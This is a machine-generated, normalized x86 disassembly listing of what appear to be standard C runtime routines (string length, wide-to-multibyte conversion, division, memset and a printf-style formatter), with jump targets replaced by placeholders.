test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax rwxdata
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_41377b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_40d7cc
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40d749
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_40d7cc
mov [ eax ] 0x2a
call sub_40d7cc
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_40d7cc
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_413d20
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_413d20
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_413904
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push [ ebp + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_40c8c3
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push eax
call sub_41377b
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x4 ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_413955
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push [ ebp + 0xc ]
call sub_41bbad
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_41377b
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
leave
retn
mov eax [ ebp - 0x4 ]
leave
retn
sub_413987
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_413bd2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x107
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_413bfc
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_413c22
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x103
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_413c4c
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_413c80
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_413d20
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_42097a
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_413d9a
mov edi edi
push ebp
mov ebp esp
push ebx
mov bl [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov al [ esi + 0x8 ]
cmp al 0x70
je r-xdata
xor ecx ecx
cmp al bl
sete cl
mov eax ecx
cmp bl 0x70
je r-xdata
cmp al 0x73
je r-xdata
xor edx edx
inc edx
cmp al 0x53
je r-xdata
xor ecx ecx
inc ecx
cmp bl 0x53
je r-xdata
xor edx edx
jmp r-xdata
cmp edx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x73
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ebp + 0x14 ]
mov eax 0x810
and ecx eax
neg ecx
sbb ecx ecx
and edx eax
neg ecx
neg edx
sbb edx edx
neg edx
cmp ecx edx
jne r-xdata
mov dl 0x64
cmp al dl
je r-xdata
test edx edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp al 0x69
je r-xdata
xor eax eax
inc eax
cmp bl 0x69
je r-xdata
cmp al dl
je r-xdata
cmp al 0x6f
je r-xdata
mov eax [ esi + 0xc ]
mov ecx eax
xor ecx [ ebp + 0x14 ]
test ecx 0x10000
jne r-xdata
cmp bl 0x6f
je r-xdata
cmp al 0x69
je r-xdata
cmp al 0x75
je r-xdata
xor eax [ ebp + 0x14 ]
test al 0x20
jne r-xdata
cmp bl 0x75
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x78
je r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
sete al
jmp r-xdata
cmp bl 0x78
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x58
je r-xdata
cmp al 0x78
je r-xdata
cmp bl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x69
je r-xdata
cmp ecx eax
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x6f
je r-xdata
cmp bl dl
je r-xdata
cmp bl 0x75
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x58
jne r-xdata
sub_413ec5
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40c75f
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_413ef8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_413ec5
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_413f1e
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_413ec5
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_40d7cc
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_413ec5
sub_413f80
mov edi edi
push ebp
mov ebp esp
sub esp 0x8d0
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
xor edi edi
lea ecx [ ebp - 0x23c ]
mov [ ebp - 0x270 ] esi
mov [ ebp - 0x214 ] eax
mov [ ebp - 0x274 ] edi
mov [ ebp - 0x210 ] edi
mov [ ebp - 0x258 ] edi
mov [ ebp - 0x278 ] edi
mov [ ebp - 0x260 ] edi
call sub_40c8c3
or [ ebp - 0x224 ] 0xffffffff
mov [ ebp - 0x25c ] edi
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40d7cc
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x230 ] 0x0
je r-xdata
cmp ebx edi
je r-xdata
push esi
call sub_40f4fc
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x234 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x240 ] edi
mov [ ebp - 0x290 ] ebx
mov [ ebp - 0x228 ] edi
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
mov eax [ ebp - 0x290 ]
or [ ebp - 0x254 ] 0xffffffff
or [ ebp - 0x218 ] 0xffffffff
or [ ebp - 0x224 ] 0xffffffff
mov [ ebp - 0x268 ] edi
mov dl [ eax ]
mov [ ebp - 0x264 ] edi
mov [ ebp - 0x27c ] edi
mov [ ebp - 0x250 ] edi
mov [ ebp - 0x220 ] edi
mov [ ebp - 0x22c ] dl
test dl dl
je r-xdata
cmp [ ebp - 0x224 ] edi
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
inc [ ebp - 0x228 ]
cmp [ ebp - 0x228 ] 0x2
jge r-xdata
mov esi eax
jmp r-xdata
cmp [ ebp - 0x230 ] 0x0
je r-xdata
xor edi edi
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor edi edi
jmp r-xdata
inc esi
xor edi edi
cmp [ ebp - 0x240 ] edi
mov [ ebp - 0x244 ] esi
jl r-xdata
mov eax [ ebp - 0x240 ]
mov eax [ ebp - 0x234 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
cmp [ ebp - 0x228 ] 0x1
jne r-xdata
cmp [ ebp - 0x264 ] edi
je r-xdata
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
cmp [ ebp - 0x224 ] 0x1
jne r-xdata
cmp [ ebp - 0x264 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
cmp [ ebp - 0x228 ] edi
jne r-xdata
cmp eax 0x8
je r-xdata
cmp [ esi ] 0x25
je r-xdata
mov ecx [ ebp - 0x264 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
xor ebx ebx
shr eax 0x4
inc ebx
mov [ ebp - 0x264 ] eax
cmp eax ebx
jne r-xdata
xor esi esi
cmp [ ebp - 0x254 ] edi
jl r-xdata
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x264 ]
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x224 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x214 ]
lea eax [ ebp - 0x8cc ]
mov esi [ ebp - 0x244 ]
mov al [ esi ]
mov [ ebp - 0x22c ] al
test al al
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x224 ] ebx
jne r-xdata
push 0xa
lea eax [ ebp - 0x25c ]
push eax
push esi
call sub_420c38
add esp 0xc
test eax eax
jle r-xdata
mov [ eax ] edx
add edx 0x4
dec ecx
je r-xdata
mov dl [ ebp - 0x22c ]
xor edi edi
push 0xa
lea eax [ ebp - 0x25c ]
push eax
push esi
call sub_420c38
mov ecx [ ebp - 0x25c ]
add esp 0xc
dec eax
lea edx [ ecx + 0x1 ]
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x244 ] edx
cmp [ ebp - 0x228 ] edi
jne r-xdata
mov dl [ ebp - 0x22c ]
mov [ ebp - 0x224 ] edi
mov eax [ ebp - 0x25c ]
cmp [ eax ] 0x24
jne r-xdata
mov ecx [ eax - 0x4 ]
dec ecx
je r-xdata
dec ecx
je r-xdata
mov esi edx
mov dl [ ebp - 0x22c ]
cmp eax edi
jl r-xdata
cmp [ ebp - 0x228 ] edi
jne r-xdata
dec ecx
je r-xdata
cmp [ ecx ] 0x24
jne r-xdata
mov [ ebp - 0x224 ] ebx
jmp r-xdata
push 0x640
lea eax [ ebp - 0x8d0 ]
push edi
push eax
call sub_413d20
add esp 0xc
mov [ eax ] edx
add edx 0x8
jmp r-xdata
dec ecx
je r-xdata
cmp eax 0x64
jge r-xdata
inc esi
add eax 0x10
cmp esi [ ebp - 0x254 ]
mov [ ebp - 0x214 ] edx
jle r-xdata
dec ecx
je r-xdata
cmp eax [ ebp - 0x254 ]
jle r-xdata
dec ecx
dec ecx
jne r-xdata
mov [ ebp - 0x254 ] eax
sub_415240
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40c75f
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_415273
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_415240
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_415299
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_415240
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_40d7cc
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_415240
sub_4152e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x238 ] eax
call sub_40c8c3
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
xor eax eax
cmp ebx eax
je r-xdata
push esi
call sub_40f4fc
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc ebx
xor eax eax
cmp [ ebp - 0x228 ] eax
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
xor esi esi
cmp [ ebp - 0x240 ] esi
je r-xdata
mov cl dl
sub cl 0x20
cmp cl 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
je r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
call sub_40d749
add esp 0x14
cmp [ ebp - 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_415e96 ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_413987
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x234 ] edi
test edi edi
jge r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_415240
jmp r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_415240
mov al [ ebx ]
inc ebx
mov [ ebp - 0x23c ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x21c ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x258 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x25c ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x25c ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x224 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_40fe78
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
test [ ebp - 0x210 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x230 ]
mov edi [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0x22c ]
call sub_415299
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
push ebx
push 0x20
call sub_415273
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
